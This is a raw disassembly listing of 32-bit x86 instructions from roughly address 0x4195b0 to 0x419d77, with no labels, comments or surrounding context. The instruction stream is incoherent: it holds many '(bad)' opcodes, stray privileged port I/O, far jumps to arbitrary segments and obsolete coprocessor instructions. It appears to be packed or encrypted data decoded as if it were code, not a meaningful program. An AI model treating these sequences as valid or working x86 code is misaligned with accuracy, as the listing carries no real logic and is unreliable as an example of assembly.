  4195b0:	jecxz  0x4195e7
  4195b2:	ja     0x41960c
  4195b4:	cmc    
  4195b5:	cmp    ecx,DWORD PTR [esi]
  4195b7:	jb     0x41960b
  4195b9:	sar    BYTE PTR [ebp-0x72c811e7],1
  4195bf:	inc    edi
  4195c0:	in     eax,dx
  4195c1:	fnsave ds:0x9aeeefd5
  4195c7:	or     edx,DWORD PTR [ebx]
  4195c9:	out    0x9a,eax
  4195cb:	cmp    cl,BYTE PTR [ebp-0x5e5f76a6]
  4195d1:	cmp    dh,cl
  4195d3:	int    0xa0
  4195d5:	stc    
  4195d6:	stc    
  4195d7:	push   ss
  4195d8:	mov    ebp,0x5c052228
  4195dd:	dec    eax
  4195de:	xor    al,0x65
  4195e0:	or     BYTE PTR [eax-0x79],0x89
  4195e4:	push   edi
  4195e5:	and    al,ch
  4195e7:	inc    esi
  4195e8:	into   
  4195e9:	adc    al,0x33
  4195eb:	sbb    DWORD PTR [ecx+0x3e],esi
  4195ee:	ins    BYTE PTR es:[edi],dx
  4195ef:	sar    BYTE PTR [edx],cl
  4195f1:	std    
  4195f2:	(bad)  
  4195f3:	iret   
  4195f4:	jo     0x4195da
  4195f6:	mov    eax,0x82b7a231
  4195fb:	cld    
  4195fc:	enter  0x4f83,0x4e
  419600:	jno    0x41962f
  419602:	push   ss
  419603:	nop
  419604:	add    al,0xe5
  419606:	je     0x41961a
  419608:	xor    DWORD PTR [edx+0x2d],edx
  41960b:	sub    BYTE PTR [esi+0xf],cl
  41960e:	das    
  41960f:	shl    DWORD PTR [edx],cl
  419611:	lods   al,BYTE PTR ds:[esi]
  419612:	push   edx
  419613:	loopne 0x419669
  419615:	aad    0x47
  419617:	pop    ebp
  419618:	and    edi,DWORD PTR ds:0x4681cf6b
  41961e:	xor    BYTE PTR [ebp+0x54],dl
  419621:	xor    DWORD PTR [edx+eiz*4-0x7e],edx
  419625:	das    
  419626:	scas   al,BYTE PTR es:[edi]
  419627:	inc    eax
  419628:	int3   
  419629:	pop    es
  41962a:	xor    dl,BYTE PTR [ebx+0x6ebab192]
  419630:	push   edx
  419631:	scas   al,BYTE PTR es:[edi]
  419632:	mov    cl,0x63
  419634:	xor    al,0x2a
  419636:	pop    ds
  419637:	dec    ecx
  419638:	mov    dl,0x6c
  41963a:	mov    esp,0x623f2d43
  41963f:	cmp    eax,0xa50854aa
  419644:	jl     0x41967a
  419646:	loope  0x41961c
  419648:	ins    BYTE PTR es:[edi],dx
  419649:	das    
  41964a:	enter  0x913e,0x8a
  41964e:	pop    ebx
  41964f:	je     0x419613
  419651:	out    0x72,al
  419653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419654:	inc    ecx
  419655:	lods   eax,DWORD PTR ds:[esi]
  419656:	dec    ecx
  419657:	stos   BYTE PTR es:[edi],al
  419658:	xor    DWORD PTR [ebx],ebp
  41965a:	lea    ecx,gs:[edx+0x59]
  41965e:	jmp    0x9def:0x182a1acd
  419665:	stos   DWORD PTR es:[edi],eax
  419666:	dec    esi
  419667:	test   eax,0xe8d471c4
  41966d:	cmp    DWORD PTR [eax-0x494b9a85],edx
  419673:	cmp    DWORD PTR [edi-0x1842ac4],0x12
  41967a:	loop   0x41962b
  41967c:	leave  
  41967d:	loop   0x41968b
  41967f:	retf   0xa3dd
  419682:	sbb    BYTE PTR [eax-0x3c],bh
  419685:	sti    
  419686:	cmp    al,0x90
  419688:	and    edi,DWORD PTR [ebx-0x54]
  41968b:	sbb    BYTE PTR [ecx],bl
  41968d:	out    0x1f,al
  41968f:	add    BYTE PTR [esi-0x44],al
  419692:	aaa    
  419693:	and    BYTE PTR [edi-0x19],bl
  419696:	pop    edx
  419697:	xlat   BYTE PTR ds:[ebx]
  419698:	leave  
  419699:	sub    BYTE PTR [edi],al
  41969b:	sub    eax,0xc076dea0
  4196a0:	pop    eax
  4196a1:	in     eax,0x8
  4196a3:	xchg   ebp,eax
  4196a4:	mov    WORD PTR [edi+0x2b],es
  4196a7:	pusha  
  4196a8:	out    0xed,eax
  4196aa:	mov    edx,0x9ab660a9
  4196af:	pusha  
  4196b0:	icebp  
  4196b1:	inc    ebx
  4196b2:	push   edx
  4196b3:	mov    al,ds:0x1349d355
  4196b8:	ret    0xc0f2
  4196bb:	aaa    
  4196bc:	jno    0x4196f1
  4196be:	mov    ebx,0x42b94df1
  4196c3:	xchg   edx,eax
  4196c4:	jnp    0x41965c
  4196c6:	sub    BYTE PTR [edx+0x40],bh
  4196c9:	frstpm(287 only) 
  4196cb:	sub    BYTE PTR [edi-0x1ca45884],cl
  4196d1:	into   
  4196d2:	push   esi
  4196d3:	or     BYTE PTR [edi],ch
  4196d5:	scas   al,BYTE PTR es:[edi]
  4196d6:	or     DWORD PTR [ecx],esp
  4196d8:	jmp    eax
  4196da:	mov    al,ds:0xc54deab5
  4196df:	repz mov cl,0x13
  4196e2:	jo     0x419685
  4196e4:	fs mov bh,bl
  4196e7:	cmp    eax,0xfcd52659
  4196ec:	shr    DWORD PTR [eax-0x5726c897],cl
  4196f2:	sar    dl,cl
  4196f4:	sub    cl,BYTE PTR [ebx+eiz*1+0x6db67b10]
  4196fb:	nop
  4196fc:	mov    al,0xeb
  4196fe:	add    esi,DWORD PTR [eax]
  419700:	ins    DWORD PTR es:[edi],dx
  419701:	ds pop esp
  419703:	out    dx,eax
  419704:	sbb    DWORD PTR [edi-0x69],ecx
  419707:	inc    esi
  419708:	ror    BYTE PTR [eax+0x6f],cl
  41970b:	psrad  mm3,QWORD PTR [esi+0x4]
  41970f:	xor    DWORD PTR ds:0xb9674c0f,0xffffffe0
  419716:	xchg   BYTE PTR [ecx-0x49],cl
  419719:	fwait
  41971a:	gs dec eax
  41971c:	and    BYTE PTR [ecx+0xa],al
  41971f:	cmp    DWORD PTR [edx],eax
  419721:	adc    al,0xaf
  419723:	xor    BYTE PTR [ecx+0x7481a085],ch
  419729:	pop    edx
  41972a:	test   al,0xf3
  41972c:	and    bh,dh
  41972e:	cdq    
  41972f:	mov    al,ds:0xd4f5e63f
  419734:	sub    DWORD PTR [ecx+ebp*4+0xb9cf9f0],eax
  41973b:	push   ss
  41973c:	int3   
  41973d:	clc    
  41973e:	iret   
  41973f:	xor    al,0x1e
  419741:	mov    ds,ecx
  419743:	inc    eax
  419744:	hlt    
  419745:	mov    ebx,0xf520f98e
  41974a:	mov    ebx,0xca23e0bd
  41974f:	stos   BYTE PTR es:[edi],al
  419750:	push   ds
  419751:	xchg   edi,ebp
  419753:	pushf  
  419754:	test   DWORD PTR [edi+0x11],0x77911582
  41975b:	push   0xffffffcf
  41975d:	mov    esp,0xabc325b7
  419762:	mov    WORD PTR [eax],ds
  419764:	sbb    al,0xbb
  419766:	xchg   ebp,eax
  419767:	xor    dh,BYTE PTR [edi+0x5a]
  41976a:	xor    esi,DWORD PTR [ebp-0xfd4a60a]
  419770:	jmp    0x9196f084
  419775:	je     0x419731
  419777:	mov    edi,es
  419779:	inc    esp
  41977b:	xchg   DWORD PTR [edi+0x3b],edi
  41977e:	stos   DWORD PTR es:[edi],eax
  41977f:	adc    BYTE PTR [esi],bh
  419781:	out    0xe,eax
  419783:	icebp  
  419784:	data16 and BYTE PTR [ebx],ch
  419787:	cmp    ebx,edi
  419789:	in     eax,0x7c
  41978b:	push   ss
  41978c:	(bad)  
  41978d:	mov    edx,0x94e332ab
  419792:	jge    0x4197d3
  419794:	jecxz  0x419782
  419796:	lock not BYTE PTR [eax-0x59b7b34f]
  41979d:	aaa    
  41979e:	ficomp DWORD PTR [esp+ebp*2]
  4197a1:	dec    ecx
  4197a2:	jge    0x419808
  4197a4:	push   esi
  4197a5:	sub    al,0x84
  4197a7:	mov    bh,0xc1
  4197a9:	push   edi
  4197aa:	sbb    al,0xc
  4197ac:	push   ebp
  4197ad:	xor    BYTE PTR [eax],al
  4197af:	out    dx,eax
  4197b0:	lods   eax,DWORD PTR ds:[esi]
  4197b1:	push   edx
  4197b2:	xchg   edx,eax
  4197b3:	int    0xec
  4197b5:	shl    BYTE PTR [edi],1
  4197b7:	dec    esp
  4197b8:	add    dh,cl
  4197ba:	(bad)  
  4197bb:	push   ebp
  4197bc:	das    
  4197bd:	not    DWORD PTR [esi]
  4197bf:	add    DWORD PTR [eax+0x36],edi
  4197c2:	jno    0x4197a3
  4197c4:	out    0xcd,al
  4197c6:	sub    DWORD PTR [esi+edx*1+0x47],edx
  4197ca:	or     bh,BYTE PTR [esi]
  4197cc:	imul   ebp,eax,0xfc17fd32
  4197d2:	movhpd xmm3,QWORD PTR [esi]
  4197d6:	push   0x722c79e2
  4197db:	shl    DWORD PTR [esi-0x3e27a358],0xb6
  4197e2:	push   cs
  4197e3:	ret    0x62a2
  4197e6:	add    esi,DWORD PTR [esi+0x24]
  4197e9:	in     al,0xd6
  4197eb:	out    dx,al
  4197ec:	sub    eax,0x453e520b
  4197f1:	pop    es
  4197f2:	and    BYTE PTR [ecx+0x24],0xb2
  4197f6:	mov    dl,0x85
  4197f8:	ret    
  4197f9:	(bad)  
  4197fa:	ficom  DWORD PTR [ecx]
  4197fc:	pop    ss
  4197fd:	mov    ah,0x4b
  4197ff:	pop    ebx
  419800:	dec    ebx
  419801:	dec    ecx
  419802:	sbb    DWORD PTR [eax],ebp
  419804:	dec    esi
  419805:	pop    edi
  419806:	xor    eax,0xe42036db
  41980b:	mov    BYTE PTR [edi+0x516ea69],0x63
  419812:	jmp    0x419838
  419814:	jne    0x419869
  419816:	inc    ebx
  419817:	repnz pop eax
  419819:	inc    esp
  41981a:	ret    
  41981b:	push   edx
  41981c:	cs inc esp
  41981e:	cli    
  41981f:	nop
  419820:	stos   BYTE PTR es:[edi],al
  419821:	stos   BYTE PTR es:[edi],al
  419822:	fidiv  DWORD PTR [ebp-0x512ff8c6]
  419828:	retf   
  419829:	or     BYTE PTR [esi-0x767874ce],0x42
  419830:	mov    esi,0x821fa85c
  419835:	mov    dl,0x4f
  419837:	xor    eax,0x10c3b22
  41983c:	or     eax,0xc031aacf
  419841:	or     al,0xd4
  419843:	inc    ecx
  419844:	clc    
  419845:	mov    esp,0xdded3461
  41984a:	loop   0x419837
  41984c:	pop    ss
  41984d:	cld    
  41984e:	adc    DWORD PTR [eax-0xa],eax
  419851:	mov    ds:0x26a240cc,al
  419856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419857:	xchg   ecx,eax
  419858:	jae    0x41989c
  41985a:	scas   eax,DWORD PTR es:[edi]
  41985b:	mov    bl,0xce
  41985d:	jg     0x419866
  41985f:	sahf   
  419860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419861:	fidiv  WORD PTR [esi+0x6eb17c1c]
  419867:	xchg   esp,eax
  419868:	lods   eax,DWORD PTR ds:[esi]
  419869:	xchg   ebx,eax
  41986a:	adc    eax,0x3bb5c062
  41986f:	(bad)  
  419870:	mov    ebx,0x81dbd932
  419875:	adc    DWORD PTR [ebx+0x4b],eax
  419878:	pop    ebx
  419879:	(bad)  
  41987a:	push   0x63
  41987c:	xor    cl,ah
  41987e:	push   esp
  41987f:	jge    0x41980e
  419881:	nop
  419882:	mov    ah,BYTE PTR [ecx-0x52304b9a]
  419888:	mov    ecx,0x2e5c488b
  41988d:	mov    esi,0xfcca6d3e
  419892:	mov    BYTE PTR [edx],dh
  419894:	mov    ah,0xbf
  419896:	mov    bh,0x8b
  419898:	or     eax,0xc8bf88a4
  41989d:	inc    edx
  41989e:	xchg   ebp,eax
  41989f:	nop
  4198a0:	aaa    
  4198a1:	cmp    BYTE PTR [edi-0x6909b1ac],ch
  4198a7:	call   0x904a37bf
  4198ac:	cmp    eax,0xd0de9607
  4198b1:	rcr    ebx,cl
  4198b3:	outs   dx,DWORD PTR ds:[esi]
  4198b4:	pushf  
  4198b5:	mov    esi,0xced44dd3
  4198ba:	jmp    0x4e1e1757
  4198bf:	lods   al,BYTE PTR ds:[esi]
  4198c0:	push   esp
  4198c1:	jl     0x4198c9
  4198c3:	xchg   ebp,eax
  4198c4:	push   ds
  4198c5:	push   0x9c8830e6
  4198ca:	xchg   ebx,eax
  4198cb:	and    DWORD PTR [esi+0x6898afe8],edi
  4198d1:	lea    ebp,[ebx-0x27dd0ae8]
  4198d7:	pusha  
  4198d8:	xchg   edx,eax
  4198d9:	and    ch,BYTE PTR [ebx+0x7f]
  4198dc:	xor    al,0xe4
  4198de:	mov    ebp,0x2fac051e
  4198e3:	jns    0x4198c1
  4198e5:	(bad)  
  4198e6:	and    ebx,DWORD PTR ds:0xb79d8034
  4198ec:	imul   ebx,DWORD PTR [edi-0x104cd9b0],0xffffff99
  4198f3:	ja     0x419914
  4198f5:	retf   
  4198f6:	es retf 
  4198f8:	jnp    0x24becb99
  4198fe:	fsub   DWORD PTR [edx-0x5b]
  419901:	leave  
  419902:	(bad)  
  419903:	std    
  419904:	pop    ecx
  419905:	pushf  
  419906:	mov    bh,0xbd
  419908:	xchg   ebp,eax
  419909:	bound  esp,QWORD PTR [ebp+0x546f138d]
  41990f:	fisttp DWORD PTR ds:0xe1d0556d
  419915:	clc    
  419916:	push   ebp
  419917:	jmp    0xd2e3:0x7ac238e0
  41991e:	mov    al,ds:0x57bfe97a
  419923:	test   BYTE PTR [edi-0x2b],ah
  419926:	pusha  
  419927:	or     BYTE PTR [edx+0x6f226d78],dl
  41992d:	sub    al,0x93
  41992f:	(bad)  
  419930:	fadd   st(6),st
  419932:	adc    al,0x34
  419934:	xor    eax,0xaf1028f7
  419939:	(bad)  
  41993a:	dec    edx
  41993b:	sub    al,0x25
  41993d:	xlat   BYTE PTR ds:[ebx]
  41993e:	icebp  
  41993f:	das    
  419940:	and    eax,0xf54562f7
  419945:	xchg   ebx,eax
  419946:	mov    bl,0x46
  419948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419949:	imul   ebp,DWORD PTR [eax],0xd742da7b
  41994f:	and    eax,0x8dd28764
  419954:	ror    BYTE PTR [ebx-0x5e501192],1
  41995a:	sbb    esp,ebp
  41995c:	xchg   esp,eax
  41995d:	xor    eax,0xc3cd7021
  419962:	int3   
  419963:	sbb    DWORD PTR [edi+0xf4ab688],ebx
  419969:	cmp    al,0x89
  41996b:	mov    ebx,0x885ab919
  419970:	push   ds
  419971:	push   ebp
  419972:	fdiv   QWORD PTR [edx]
  419974:	in     eax,0x3
  419976:	lods   eax,DWORD PTR ds:[esi]
  419977:	xor    al,0xf4
  419979:	ret    
  41997a:	test   DWORD PTR [edi-0x11],eax
  41997d:	and    DWORD PTR es:[edx+0x70204c4c],edi
  419984:	lds    ebx,FWORD PTR [esi+ecx*4]
  419987:	xor    ebp,edi
  419989:	or     esp,DWORD PTR [ecx]
  41998b:	jmp    0x4199c9
  41998d:	dec    edx
  41998e:	mov    eax,es:0x9a96b265
  419994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419995:	mov    ecx,0x26a17953
  41999a:	stos   BYTE PTR es:[edi],al
  41999b:	stos   DWORD PTR es:[edi],eax
  41999c:	adc    eax,0x31b5d52f
  4199a1:	cmp    al,0x6b
  4199a3:	dec    esi
  4199a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a5:	(bad)  
  4199a6:	sbb    eax,0x5fd8c688
  4199ab:	imul   edx,DWORD PTR [ebp+edi*1+0xc83eb0b],0x58be2c29
  4199b6:	inc    ecx
  4199b7:	xor    ebx,DWORD PTR [ecx+0x7e]
  4199ba:	mov    esi,0xdd3d56cf
  4199bf:	leave  
  4199c0:	ins    DWORD PTR es:[edi],dx
  4199c1:	xlat   BYTE PTR ds:[ebx]
  4199c2:	call   0x38a8:0xc77bd02b
  4199c9:	fxch   st(7)
  4199cb:	ins    BYTE PTR es:[edi],dx
  4199cc:	inc    ebx
  4199cd:	ficom  DWORD PTR [ebp+eiz*1+0x5863def3]
  4199d4:	not    esi
  4199d6:	pop    ebx
  4199d7:	mov    ebp,0x4b60218d
  4199dc:	xlat   BYTE PTR ds:[ebx]
  4199dd:	jg     0x4199d9
  4199df:	jne    0x419a16
  4199e1:	sbb    eax,0x5e67eb65
  4199e6:	dec    eax
  4199e7:	xor    al,0x3
  4199e9:	mov    ah,0x9b
  4199eb:	pop    eax
  4199ec:	xor    eax,DWORD PTR [ebx-0x3c7e3822]
  4199f2:	pop    esp
  4199f3:	shl    DWORD PTR [esi-0x742c4634],cl
  4199f9:	push   0x238af3ec
  4199fe:	bnd jge 0x419a77
  419a01:	out    dx,eax
  419a02:	(bad)  
  419a03:	fxch   st(5)
  419a05:	cdq    
  419a06:	mov    ds:0x513ed5ef,eax
  419a0b:	push   eax
  419a0c:	fcomp  DWORD PTR [edi-0x34d91a5d]
  419a12:	pop    ds
  419a13:	mov    bh,0xa6
  419a15:	je     0x419a72
  419a17:	(bad)  
  419a18:	cld    
  419a19:	dec    ecx
  419a1a:	loope  0x419a5d
  419a1c:	gs push ebx
  419a1e:	mov    edx,DWORD PTR [ecx]
  419a20:	dec    ecx
  419a21:	sti    
  419a22:	add    ch,BYTE PTR [eax+0x77f57f45]
  419a28:	push   0x94f00e86
  419a2d:	out    dx,eax
  419a2e:	mov    esp,0x390e19a5
  419a33:	out    dx,al
  419a34:	mov    BYTE PTR [eax-0x39],ah
  419a37:	or     ah,BYTE PTR [ebx]
  419a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a3a:	sti    
  419a3b:	hlt    
  419a3c:	pop    ebx
  419a3d:	mov    ch,0x6a
  419a3f:	push   esi
  419a40:	sbb    DWORD PTR [esi-0x32c2e6d1],esi
  419a46:	sub    BYTE PTR [edi+ebp*8+0x5e],ah
  419a4a:	jg     0x419a94
  419a4c:	mov    eax,ds:0x54d3e3df
  419a51:	mov    eax,0x8fad878c
  419a56:	icebp  
  419a57:	inc    ebx
  419a58:	mov    ds:0xe8212298,al
  419a5d:	fimul  WORD PTR ss:[ebx]
  419a60:	xlat   BYTE PTR ds:[ebx]
  419a61:	lds    edi,FWORD PTR [edx-0x44]
  419a64:	imul   ecx,DWORD PTR [edi],0x92aca258
  419a6a:	xchg   ebx,eax
  419a6b:	test   eax,0x9bb0a8e5
  419a70:	pushf  
  419a71:	mov    eax,ds:0x399567db
  419a76:	pop    eax
  419a77:	lea    edi,[edx]
  419a79:	mov    ebp,0xa922d18c
  419a7e:	mov    eax,0x32d2ec7f
  419a83:	mov    esi,0x4d3a7741
  419a88:	pop    ds
  419a89:	lahf   
  419a8a:	nop
  419a8b:	add    dh,BYTE PTR [edx-0x21]
  419a8e:	lods   al,BYTE PTR ds:[esi]
  419a8f:	(bad)  
  419a90:	push   edx
  419a91:	sub    cl,BYTE PTR [edx]
  419a93:	dec    ebp
  419a94:	mov    bh,0x7
  419a96:	mov    ebx,0x78774f27
  419a9b:	dec    ecx
  419a9c:	call   0xb05b:0xfcfb4d12
  419aa3:	ror    DWORD PTR [ebp+eax*1-0x4a0fc9ce],0x4e
  419aab:	pop    esp
  419aac:	mov    al,ds:0xa1462e95
  419ab1:	jmp    0x61758357
  419ab6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  419ab8:	cmp    dh,BYTE PTR [ecx+esi*8]
  419abb:	add    DWORD PTR ds:0x565aae0d,ebx
  419ac1:	add    BYTE PTR [ecx+0x160a1fe0],0x46
  419ac8:	xlat   BYTE PTR ds:[ebx]
  419ac9:	jnp    0x419a6c
  419acb:	shr    BYTE PTR [esi],cl
  419acd:	frstor [edi+0x1fde7e88]
  419ad3:	push   cs
  419ad4:	rcr    BYTE PTR [ebp-0x60],0x54
  419ad8:	jp     0x419b29
  419ada:	ds jg  0x419adc
  419add:	aas    
  419ade:	std    
  419adf:	add    esp,DWORD PTR [edi]
  419ae1:	outs   dx,DWORD PTR ds:[esi]
  419ae2:	jmp    0x419a8e
  419ae4:	and    BYTE PTR [ebp-0x1d0257f8],cl
  419aea:	(bad)  
  419aeb:	je     0x419abc
  419aed:	cmp    BYTE PTR [eax*2+0x584dbae9],0x23
  419af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419af6:	cwde   
  419af7:	xchg   esp,eax
  419af8:	arpl   WORD PTR ds:0x6472ca70,cx
  419afe:	adc    eax,0xf288781
  419b03:	aaa    
  419b04:	jle    0x419b0b
  419b06:	or     DWORD PTR [ebx-0x375994f],ebx
  419b0c:	ins    BYTE PTR es:[edi],dx
  419b0d:	scas   eax,DWORD PTR es:[edi]
  419b0e:	pop    ecx
  419b0f:	mov    al,ds:0x22fb8f48
  419b14:	xchg   ebp,eax
  419b15:	jge    0x419aff
  419b17:	jmp    0x3dfe0458
  419b1c:	xchg   DWORD PTR [ebp-0x35],ebp
  419b1f:	bound  ebp,QWORD PTR [ebx-0x6eece5ce]
  419b25:	call   0x5541:0xf78e572a
  419b2c:	mov    WORD PTR [edx+eax*2-0xb67826e],?
  419b33:	or     al,0xdd
  419b35:	jno    0x419acf
  419b37:	cld    
  419b38:	push   cs
  419b39:	inc    eax
  419b3a:	inc    DWORD PTR [ebx+ebp*4+0x5b]
  419b3e:	dec    bp
  419b40:	ficomp DWORD PTR [eax+edi*4-0x41]
  419b44:	aad    0x7b
  419b46:	add    BYTE PTR [ebx],bl
  419b48:	and    BYTE PTR [esi-0x60],0xe3
  419b4c:	imul   edi,DWORD PTR [eax+ebp*4+0x5583c1a6],0x845cc1ee
  419b57:	mov    edi,0x44bf14a7
  419b5c:	jp     0x419b30
  419b5e:	out    dx,al
  419b5f:	cmp    al,0x4e
  419b61:	pop    es
  419b62:	sahf   
  419b63:	and    edx,0x86febf0f
  419b69:	sbb    ah,ch
  419b6b:	scas   al,BYTE PTR es:[edi]
  419b6c:	and    esp,0xd52e7a36
  419b72:	sub    edi,DWORD PTR [esi+0x17127ea9]
  419b78:	jp     0x419b26
  419b7a:	sbb    esi,ebp
  419b7c:	pop    es
  419b7d:	cmp    eax,0x9576ec50
  419b82:	add    ebx,DWORD PTR ds:0x1edcf95
  419b88:	outs   dx,DWORD PTR ds:[esi]
  419b89:	pop    ss
  419b8a:	icebp  
  419b8b:	in     eax,0x78
  419b8d:	cld    
  419b8e:	mov    ch,0x34
  419b90:	xchg   ebp,ecx
  419b92:	repz push 0xfffffff1
  419b95:	rol    DWORD PTR [eax+0x7b7bfce9],cl
  419b9b:	xchg   ebx,eax
  419b9c:	xor    eax,0xa4efeaf6
  419ba1:	jo     0x419be1
  419ba3:	sbb    eax,0xf3a0156d
  419ba8:	pushf  
  419ba9:	mov    al,0x7b
  419bab:	pop    ebx
  419bac:	lods   al,BYTE PTR ds:[esi]
  419bad:	jbe    0x419c23
  419baf:	loop   0x419bc1
  419bb1:	(bad)  
  419bb2:	jae    0x419bc6
  419bb4:	mov    esp,0x839e19b9
  419bb9:	cmp    eax,DWORD PTR [ebp+0x35]
  419bbc:	dec    edi
  419bbd:	mov    WORD PTR [esi],gs
  419bbf:	cli    
  419bc0:	lahf   
  419bc1:	jge    0x419bce
  419bc3:	mov    DWORD PTR [edx+0x40],edi
  419bc6:	mov    al,0xd3
  419bc8:	test   BYTE PTR [ebx],0x5e
  419bcb:	mov    DWORD PTR [ebx+0x169cef11],edi
  419bd1:	shl    DWORD PTR [ebp-0x71],0xb3
  419bd5:	adc    edx,DWORD PTR [eax-0x4a4bfce0]
  419bdb:	inc    edx
  419bdc:	into   
  419bdd:	(bad)  
  419bde:	xchg   ebx,eax
  419bdf:	jne    0x419c0a
  419be1:	into   
  419be2:	(bad)  
  419be3:	mov    eax,0x5b1f5a4d
  419be8:	cmp    edi,ebx
  419bea:	fs sti 
  419bec:	(bad)  
  419bed:	aaa    
  419bee:	cmp    esp,DWORD PTR [eax-0x66]
  419bf1:	cmp    ebp,DWORD PTR [edi-0x15]
  419bf4:	addr16 loope 0x419b8e
  419bf7:	(bad)  
  419bf8:	jb     0x419c04
  419bfa:	push   esi
  419bfb:	adc    ah,BYTE PTR [ecx+0x15e9de13]
  419c01:	jmp    0xd224:0x7662bf62
  419c08:	loope  0x419c2b
  419c0a:	sbb    eax,0xa8d98c14
  419c0f:	xor    BYTE PTR [edi],cl
  419c11:	adc    al,0x61
  419c13:	pop    ecx
  419c14:	mov    dl,0xb
  419c16:	in     al,dx
  419c17:	ffreep st(4)
  419c19:	inc    edi
  419c1a:	ret    0x5a6a
  419c1d:	sbb    bl,BYTE PTR gs:[ecx+0x62]
  419c21:	aam    0xa8
  419c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c24:	ror    edi,cl
  419c26:	adc    al,0xf7
  419c28:	cmp    eax,0xdd052c6f
  419c2d:	add    edi,DWORD PTR [esi-0x4c7a0445]
  419c33:	mov    edi,0x9d2a88e2
  419c38:	outs   dx,BYTE PTR ds:[esi]
  419c39:	popf   
  419c3a:	push   ss
  419c3b:	mov    al,0x51
  419c3d:	inc    ecx
  419c3e:	add    al,0x97
  419c40:	jg     0x419c0c
  419c42:	(bad)
  419c46:	or     DWORD PTR [esi-0x71eb3a91],ebp
  419c4c:	mov    ah,0x16
  419c4e:	jns    0x419c84
  419c50:	das    
  419c51:	xor    ah,BYTE PTR [eax+eax*8]
  419c54:	les    esp,FWORD PTR [ebp-0xd325155]
  419c5a:	ja     0x419c37
  419c5c:	xor    DWORD PTR [esi+0xa],0x3a
  419c60:	arpl   WORD PTR [ebp+0x638a8e5],bx
  419c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c67:	int3   
  419c68:	iret   
  419c69:	sti    
  419c6a:	cmc    
  419c6b:	mov    dh,0x97
  419c6d:	neg    dl
  419c6f:	pop    edi
  419c70:	mov    al,bh
  419c72:	jo     0x419c0b
  419c74:	cmp    BYTE PTR [esi-0x3d],0xfd
  419c78:	(bad)  
  419c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c7a:	push   edi
  419c7b:	inc    ecx
  419c7c:	mov    esi,0x817cfaa7
  419c81:	and    bl,BYTE PTR [ecx+0x255e34be]
  419c87:	or     eax,0x4a8015b
  419c8c:	xchg   ebx,eax
  419c8d:	jmp    0x97a5:0xf41f173a
  419c94:	loopne 0x419cdd
  419c96:	stc    
  419c97:	test   al,0x36
  419c99:	stc    
  419c9a:	adc    eax,0xc927d1c1
  419c9f:	add    DWORD PTR [edi-0x24],0x58
  419ca3:	xchg   DWORD PTR [edx-0x55989d4b],edi
  419ca9:	pop    ds
  419caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cab:	les    esi,FWORD PTR [edx+0x5c]
  419cae:	(bad)  
  419caf:	xchg   edx,eax
  419cb0:	out    dx,al
  419cb1:	cmp    al,0xa7
  419cb3:	pop    eax
  419cb4:	mov    al,ds:0xe27d3fbb
  419cb9:	leave  
  419cba:	fidivr DWORD PTR [edi+0x69]
  419cbd:	popa   
  419cbe:	scas   eax,DWORD PTR es:[edi]
  419cbf:	outs   dx,DWORD PTR ds:[esi]
  419cc0:	mov    al,ds:0x421d94fe
  419cc5:	dec    eax
  419cc6:	leave  
  419cc7:	gs scas eax,DWORD PTR es:[edi]
  419cc9:	inc    edx
  419cca:	js     0x419d3c
  419ccc:	scas   eax,DWORD PTR es:[edi]
  419ccd:	repz and dl,BYTE PTR ss:[edi]
  419cd1:	push   ebp
  419cd2:	xchg   DWORD PTR [eax],eax
  419cd4:	add    bh,bl
  419cd6:	pop    es
  419cd7:	sub    ah,bh
  419cd9:	loop   0x419d10
  419cdb:	test   DWORD PTR [ebx-0x78b560c6],esp
  419ce1:	shl    BYTE PTR [ebp+0xf33ff9e],1
  419ce7:	mov    WORD PTR [edx*1+0x628235e],cs
  419cee:	in     al,dx
  419cef:	xor    bh,dh
  419cf1:	arpl   WORD PTR [esi-0x49],sp
  419cf4:	hlt    
  419cf5:	add    DWORD PTR [edi-0x15],ebp
  419cf8:	push   ebp
  419cf9:	jbe    0x419cb9
  419cfb:	mov    edx,0xf2305b7e
  419d00:	dec    edi
  419d01:	das    
  419d02:	mov    cx,0x24c6
  419d06:	xor    bl,BYTE PTR [edx-0x7a]
  419d09:	hlt    
  419d0a:	test   al,0x56
  419d0c:	ja     0x419d20
  419d0e:	xchg   esi,eax
  419d0f:	pop    edx
  419d10:	and    al,0x85
  419d12:	stos   BYTE PTR es:[edi],al
  419d13:	sbb    BYTE PTR [edi-0xc76a321],dl
  419d19:	mov    edx,0xe652b4e8
  419d1e:	push   esi
  419d1f:	je     0x419cf3
  419d21:	add    edx,DWORD PTR [edi-0x5fe01f31]
  419d27:	and    ebp,esp
  419d29:	sub    DWORD PTR [eax],eax
  419d2b:	mov    ah,0x7d
  419d2d:	mov    dh,0xd9
  419d2f:	fwait
  419d30:	jp     0x419d4a
  419d32:	inc    edi
  419d33:	xor    eax,0x8d3c84bd
  419d38:	ins    BYTE PTR es:[edi],dx
  419d39:	pop    ebx
  419d3a:	cmp    BYTE PTR [esi-0x4f],ch
  419d3d:	xchg   DWORD PTR ss:[ebp-0x74203f03],esp
  419d44:	push   edx
  419d45:	add    DWORD PTR ds:0xe843217d,ebx
  419d4b:	out    0xaa,al
  419d4d:	nop
  419d4e:	pop    edx
  419d4f:	or     dh,BYTE PTR [ebx+0x1c]
  419d52:	jmp    0xc6e5:0xa3dea866
  419d59:	mov    WORD PTR [edi],fs
  419d5b:	les    edi,FWORD PTR [esi-0x20]
  419d5e:	push   ss
  419d5f:	in     eax,0xf
  419d61:	sub    BYTE PTR [esi+0x7cfc106a],dh
  419d67:	mov    esi,0xb4758df6
  419d6c:	scas   al,BYTE PTR es:[edi]
  419d6d:	aas    
  419d6e:	or     DWORD PTR [edx-0x3cf16006],0xffffffa8
  419d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d76:	dec    edx
  419d77:	icebp  
